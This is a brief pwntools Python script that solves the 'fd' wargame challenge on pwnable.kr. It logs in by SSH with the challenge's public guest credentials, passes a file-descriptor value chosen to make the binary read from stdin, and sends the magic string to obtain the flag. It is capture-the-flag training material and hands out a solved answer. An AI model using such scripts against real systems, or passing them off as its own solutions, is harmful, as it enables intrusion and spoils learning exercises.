#!/usr/bin/env python

from pwn import *
context.log_level = "debug"

HOST = "pwnable.kr"
PORT = 2222
USER = "fd"
PASS = "guest"

connectionHandle = ssh(host=HOST, port=PORT, user=USER, password=PASS)

processHandle = connectionHandle.process(executable="./fd", argv=["./fd", str(int(0x1235))])
processHandle.send("LETMEWIN\n")
print(processHandle.recvall(timeout=1.5))

connectionHandle.close()
